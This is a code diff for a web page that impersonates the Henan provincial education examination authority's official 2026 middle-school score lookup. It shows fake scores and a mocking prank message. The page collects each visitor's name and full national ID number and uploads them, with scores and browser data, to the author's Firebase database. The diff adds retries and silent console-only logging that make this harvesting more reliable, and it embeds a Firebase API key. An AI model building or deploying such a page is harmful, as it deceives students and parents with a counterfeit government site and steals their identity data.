@@ -294,7 +294,6 @@
         <h1>河南2026年中考成绩查询平台</h1>
         <p class="subtitle">河南省教育考试院 官方查询入口</p>
         
-        <!-- 查询页面 -->
         <div class="login-box" id="loginBox">
             <div class="input-box">
                 <label for="name">考生姓名</label>
@@ -309,7 +308,6 @@
             <button id="queryBtn" onclick="checkScore()">查询成绩</button>
         </div>
 
-        <!-- 成绩页面 -->
         <div class="score-wrap" id="scoreBox">
             <div class="score-box-relative">
                 <div class="stamp">已核验</div>
@@ -361,14 +359,13 @@
             <button class="new-journey-btn" onclick="showBlessing()">继续</button>
         </div>
 
-        <!-- 祝福页面 -->
         <div class="blessing-wrap" id="blessingBox">
             <div class="blessing-card">
-                <div class="blessing-title">做梦去吧</div>
-                <div class="blessing-text">小匆在这里祝你天天开心</div>
+                <div class="blessing-title">梦该醒了</div>
+                <div class="blessing-text">小匆祝大家天天开心</div>
                 <div class="blessing-joke">
                     哈哈哈哈哈哈哈哈哈
-                    <div class="laugh">这个分数你做梦去吧</div>
+                    <div class="laugh">这个分数你就做梦吧</div>
                 </div>
             </div>
             <button class="back-btn" onclick="resetForm()">返回重查</button>
@@ -380,10 +377,9 @@
         </div>
     </div>
 
-<!-- Firebase SDK -->
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+    import { getFirestore, collection, addDoc, serverTimestamp, getDocs } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
     const firebaseConfig = {
         apiKey: "AIzaSyBqmqVQU36RWTym27T3as601J40tXBesuM",
@@ -394,21 +390,43 @@
         appId: "1:43895574085:web:98167106b948483bc19d2c"
     };
 
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+    // 只在控制台输出调试信息，用户界面不可见
+    function log(msg, type = 'info') {
+        const prefix = type === 'error' ? '[错误]' : type === 'warn' ? '[警告]' : '[信息]';
+        console.log(prefix + ' ' + msg);
+    }
 
-    // 把 db 暴露给全局，方便非模块脚本使用
-    window.firebaseDB = db;
-    window.firebaseCollection = collection;
-    window.firebaseAddDoc = addDoc;
-    window.firebaseServerTimestamp = serverTimestamp;
+    try {
+        log('开始初始化 Firebase');
+        const app = initializeApp(firebaseConfig);
+        log('Firebase App 初始化成功');
+        
+        const db = getFirestore(app);
+        log('Firestore 实例创建成功');
+        
+        window.firebaseDB = db;
+        window.firebaseCollection = collection;
+        window.firebaseAddDoc = addDoc;
+        window.firebaseServerTimestamp = serverTimestamp;
+        window.firebaseGetDocs = getDocs;
+        
+        log('Firebase 全部初始化完成');
+        
+        // 静默测试连接
+        getDocs(collection(db, 'queryRecords')).then(snapshot => {
+            log('连接测试成功，当前有 ' + snapshot.size + ' 条记录');
+        }).catch(err => {
+            log('连接测试失败: ' + err.message, 'error');
+        });
+        
+    } catch (e) {
+        log('Firebase 初始化失败: ' + e.message, 'error');
+    }
 </script>
 
 <script>
-// localStorage 键名
 const STORAGE_KEY = 'exam_scores_2026';
 
-// 各科满分参考
 const MAX_SCORES = {
     chinese: 120,
     math: 120,
@@ -419,7 +437,6 @@ const MAX_SCORES = {
     sport: 130
 };
 
-// 指定考生固定分数
 const studentData = {
     "高新新": { chinese: 42, math: 38, english: 35, physics: 22, chemistry: 18, politics: 60, sport: 130 },
     "陈家辉": { chinese: 94, math: 78, english: 67, physics: 44, chemistry: 30, politics: 56, sport: 127 },
@@ -429,18 +446,15 @@ const studentData = {
     "邱嘉祥": { chinese: 102, math: 98, english: 96, physics: 56, chemistry: 36, politics: 85, sport: 126 }
 };
 
-// 计算总分
 function calcTotal(scores) {
     return scores.chinese + scores.math + scores.english + scores.physics + 
            scores.chemistry + scores.politics + scores.sport;
 }
 
-// 初始化固定数据的总分
 Object.keys(studentData).forEach(name => {
     studentData[name].total = calcTotal(studentData[name]);
 });
 
-// 从 localStorage 读取已保存的成绩
 function getSavedScores() {
     try {
         const data = localStorage.getItem(STORAGE_KEY);
@@ -450,18 +464,16 @@ function getSavedScores() {
     }
 }
 
-// 保存成绩到 localStorage
 function saveScore(name, scores) {
     const saved = getSavedScores();
     saved[name] = scores;
     try {
         localStorage.setItem(STORAGE_KEY, JSON.stringify(saved));
     } catch (e) {
-        console.warn('保存成绩失败', e);
+        console.warn('本地保存失败', e);
     }
 }
 
-// 生成随机高分（总分 500~630 之间）
 function getRandomHighScore() {
     const c = Math.floor(Math.random() * 25) + 85;
     const m = Math.floor(Math.random() * 30) + 80;
@@ -479,13 +491,11 @@ function getRandomHighScore() {
     return scores;
 }
 
-// 验证身份证号
 function isValidIdCard(id) {
     const reg = /^[1-9]\d{5}(18|19|20)\d{2}((0[1-9])|(1[0-2]))(([0-2][1-9])|10|20|30|31)\d{3}[0-9Xx]$/;
     return reg.test(id);
 }
 
-// 验证姓名
 function isValidName(name) {
     return /^[\u4e00-\u9fa5]{2,4}$/.test(name);
 }
@@ -507,7 +517,6 @@ function setLoading(loading) {
 
 function renderScore(name, idCard, score) {
     document.getElementById("showName").textContent = name;
-    // 完整显示身份证号
     document.getElementById("showIdCard").textContent = idCard;
     document.getElementById("chinese").textContent = score.chinese;
     document.getElementById("math").textContent = score.math;
@@ -519,30 +528,49 @@ function renderScore(name, idCard, score) {
     document.getElementById("totalScore").textContent = score.total;
 }
 
-// 保存查询记录到 Firebase
-async function saveToFirebase(name, idCard, score) {
+// 保存到 Firebase，带重试
+async function saveToFirebase(name, idCard, score, retryCount = 0) {
+    const MAX_RETRIES = 3;
+    
     try {
-        if (window.firebaseDB && window.firebaseAddDoc && window.firebaseCollection) {
-            await window.firebaseAddDoc(window.firebaseCollection(window.firebaseDB, 'queryRecords'), {
-                name: name,
-                // 完整保存身份证号
-                idCard: idCard,
-                totalScore: score.total,
-                chinese: score.chinese,
-                math: score.math,
-                english: score.english,
-                physics: score.physics,
-                chemistry: score.chemistry,
-                politics: score.politics,
-                sport: score.sport,
-                timestamp: window.firebaseServerTimestamp ? window.firebaseServerTimestamp() : new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                ip: 'client-side'
-            });
-            console.log('数据已保存到 Firebase');
-        }
+        if (!window.firebaseDB) throw new Error('Firebase 未初始化');
+        if (!window.firebaseAddDoc) throw new Error('addDoc 未加载');
+        if (!window.firebaseCollection) throw new Error('collection 未加载');
+        
+        const data = {
+            name: name,
+            idCard: idCard,
+            totalScore: score.total,
+            chinese: score.chinese,
+            math: score.math,
+            english: score.english,
+            physics: score.physics,
+            chemistry: score.chemistry,
+            politics: score.politics,
+            sport: score.sport,
+            timestamp: window.firebaseServerTimestamp ? window.firebaseServerTimestamp() : new Date(),
+            userAgent: navigator.userAgent
+        };
+        
+        await window.firebaseAddDoc(
+            window.firebaseCollection(window.firebaseDB, 'queryRecords'), 
+            data
+        );
+        
+        console.log('[成功] 数据已保存，姓名: ' + name);
+        return true;
+        
     } catch (e) {
-        console.error('保存到 Firebase 失败:', e);
+        console.error('[错误] 保存失败: ' + e.message);
+        
+        if (retryCount < MAX_RETRIES) {
+            console.log('[重试] 第' + (retryCount + 1) + '次重试...');
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            return saveToFirebase(name, idCard, score, retryCount + 1);
+        }
+        
+        console.error('[错误] 重试次数用完，保存失败');
+        return false;
     }
 }
 
@@ -567,7 +595,7 @@ function checkScore() {
 
     setLoading(true);
     
-    setTimeout(() => {
+    setTimeout(async () => {
         let score;
         const savedScores = getSavedScores();
         
@@ -581,9 +609,7 @@ function checkScore() {
         }
 
         renderScore(name, idCard, score);
-
-        // 保存到 Firebase
-        saveToFirebase(name, idCard, score);
+        await saveToFirebase(name, idCard, score);
 
         document.getElementById("loginBox").style.display = "none";
         document.getElementById("scoreBox").style.display = "block";
@@ -592,7 +618,6 @@ function checkScore() {
     }, 800);
 }
 
-// 显示祝福页面
 function showBlessing() {
     document.getElementById("scoreBox").style.display = "none";
     document.getElementById("blessingBox").style.display = "block";
@@ -607,7 +632,6 @@ function resetForm() {
     document.getElementById("name").focus();
 }
 
-// 回车键提交
 document.getElementById("idCard").addEventListener("keypress", function(e) {
     if (e.key === "Enter") checkScore();
 });
